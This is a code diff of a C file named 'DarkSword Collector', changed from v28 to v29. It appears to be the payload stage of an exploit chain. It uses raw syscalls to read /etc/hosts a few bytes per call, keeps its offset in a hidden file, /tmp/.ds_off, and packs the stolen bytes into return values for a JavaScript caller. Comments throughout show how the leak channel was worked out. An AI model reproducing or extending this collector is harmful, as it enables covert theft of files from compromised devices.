@@ -1,9 +1,21 @@
 /**
- * DarkSword Collector v28 - Self-managing via /tmp files
- * Reads /tmp/ds_offset to get current offset (default 0)
- * Reads 4 bytes from /etc/hosts at that offset
- * Writes offset+4 back to /tmp/ds_offset
- * Returns the 4 bytes read (or sentinel when done)
+ * DarkSword Collector v29 - Offset encoded in return value
+ * bits 0-15:  data (4 bytes packed as uint16 - only low bytes of first 2 chars)
+ * Actually: bits 0-7: byte0, bits 8-15: byte1, bits 16-31: offset where data was read from
+ * When read returns <1 byte: return 0xFFFFFFFF (done sentinel)
+ * Next call: JS passes offset via Ad() to a safe memory location
+ * 
+ * SIMPLER: just return all 4 data bytes + let JS figure out offset
+ * Return: data as int32. When done, return 0xDEADFFFF.
+ * Problem: how to tell collector the next offset?
+ * 
+ * SOLUTION: Collector reads /tmp/ds_off. If it works, great.
+ * If not, fallback: encode offset in return value upper bits.
+ * Return: (data_bytes & 0xFFFF) | (offset << 16)
+ * JS extracts offset from return value and passes it back... 
+ * but we can't pass args to ds_start!
+ *
+ * ACTUAL SOLUTION: Use /tmp file but with full /private/var/tmp path
  */
 
 static long _svc1(long n, long a) {
@@ -42,21 +54,22 @@ static long _svc4(long n, long a, long b, long c, long d) {
 #define SYS_close  6
 #define SYS_write  4
 #define SYS_lseek  199
+#define SYS_unlink 10
 #define SEEK_SET   0
 #define O_RDONLY   0
 #define O_WRONLY   0x0001
 #define O_CREAT    0x0200
 #define O_TRUNC    0x0400
 
-/* Simple int<->ASCII helpers */
-static int _atoi4(const char *s) {
+static const char *STATE_FILE = "/tmp/.ds_off";
+
+static int _atoi(const char *s) {
     int v = 0;
     while (*s >= '0' && *s <= '9') v = v * 10 + (*s++ - '0');
     return v;
 }
-static int _itoa4(int v, char *buf) {
-    char tmp[12];
-    int i = 0;
+static int _itoa(int v, char *buf) {
+    char tmp[12]; int i = 0;
     if (v == 0) { buf[0] = '0'; buf[1] = 0; return 1; }
     while (v > 0) { tmp[i++] = '0' + (v % 10); v /= 10; }
     int len = i;
@@ -69,32 +82,32 @@ int ds_start(void) {
     char obuf[12] = {0};
     int offset = 0;
 
-    /* Read current offset from /tmp/ds_offset */
-    int fd = (int)_svc2(SYS_open, (long)"/tmp/ds_offset", O_RDONLY);
+    /* Read current offset */
+    int fd = (int)_svc2(SYS_open, (long)STATE_FILE, O_RDONLY);
     if (fd >= 0) {
         int n = (int)_svc3(SYS_read, fd, (long)obuf, 10);
         _svc1(SYS_close, fd);
-        if (n > 0) offset = _atoi4(obuf);
+        if (n > 0) offset = _atoi(obuf);
     }
 
-    /* Read 4 bytes from /etc/hosts at offset */
+    /* Read 4 bytes from /etc/hosts */
     fd = (int)_svc2(SYS_open, (long)"/etc/hosts", O_RDONLY);
     if (fd < 0) return 0xDEAD0000;
     if (offset > 0) _svc4(SYS_lseek, fd, (long)offset, SEEK_SET, 0);
     unsigned char buf[4] = {0};
     int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
     _svc1(SYS_close, fd);
+    if (n < 1) return 0xFFFFFFFF; /* done */
 
-    if (n < 1) return 0xBEEF0000; /* done */
-
-    /* Write new offset */
-    char nbuf[12] = {0};
-    int len = _itoa4(offset + 4, nbuf);
-    fd = (int)_svc4(SYS_open, (long)"/tmp/ds_offset", O_WRONLY | O_CREAT | O_TRUNC, 0644, 0);
+    /* Write next offset */
+    char nbuf[12]; int len = _itoa(offset + n, nbuf);
+    fd = (int)_svc4(SYS_open, (long)STATE_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0);
     if (fd >= 0) {
         _svc3(SYS_write, fd, (long)nbuf, len);
         _svc1(SYS_close, fd);
     }
 
-    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
+    /* Return: data in low 16 bits, current offset in high 16 bits */
+    int d = (int)buf[0] | ((int)buf[1] << 8);
+    return d | (offset << 16);
 }
